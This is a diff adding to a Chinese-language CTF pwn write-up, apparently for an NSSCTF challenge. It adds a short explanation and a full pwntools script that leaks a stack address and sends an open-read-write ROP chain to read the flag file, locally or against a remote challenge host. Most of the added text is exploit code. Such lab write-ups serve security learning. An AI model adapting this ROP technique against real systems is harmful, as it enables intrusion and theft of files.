@@ -135,4 +135,128 @@ p.interactive()
 ![[Pasted image 20250302223809.png]]
 再看看print函数以及gadgets函数，利用这些可以做到控制rax,rsi,rdi,rbx,r13,r15，
 ![[Pasted image 20250302224032.png]]
-接受一下泄漏的地址可以发现是栈地址，可以把文件路径cun
+接受一下泄漏的地址可以发现是栈地址，可以把文件路径存在这里后面调用。
+调试很久本打算控制寄存器调用execve直接binsh，但发现不能控制rdx用不了execve（也可能我哪里弄错了），最后选择构造orw。
+```python
+from pwn import *
+from wstube import websocket
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+ip = 'node2.anna.nssctf.cn'
+port = 28073
+if local:
+p = process('./stack')
+pwnlib.gdb.attach(p, 'b *0x401033')
+else:
+p = remote(ip, port)
+# p = websocket()  
+
+ret = 0x401013
+elf = ELF('./stack')
+
+p.recvuntil(b'\x20\x29\x0a')
+recv = u64(p.recv(6).ljust(8, b'\x00'))
+log.success(f'recv: {hex(recv)}')
+
+p.recvuntil(b'\x3e\x3e\x20')
+payload = flat([
+# open
+0x401017,
+0,
+0,
+'./flag\x00\x00',
+0x401017,
+0,
+0,
+2,
+2,
+0x40100c,
+0x401017,
+0,
+0,
+0,
+0x401017,
+0,
+recv,
+0,
+
+0,
+
+0x401077,
+
+# read
+
+0x401017,
+
+0,
+
+0,
+
+0,
+
+0x40100c,
+
+0x401017,
+
+0,
+
+0,
+
+0,
+
+0x401017,
+
+0x4023d0,
+
+3,
+
+0,
+
+0,
+
+0x401077,
+
+# write
+
+0x401017,
+
+0,
+
+0,
+
+1,
+
+0x40100c,
+
+0x401017,
+
+0,
+
+0,
+
+0,
+
+0x401017,
+
+0x402000 - 0x10,
+
+1,
+
+0,
+
+0,
+
+0x401077,
+
+  
+
+])
+
+p.sendline(payload)
+
+  
+  
+
+p.interactive()
+```
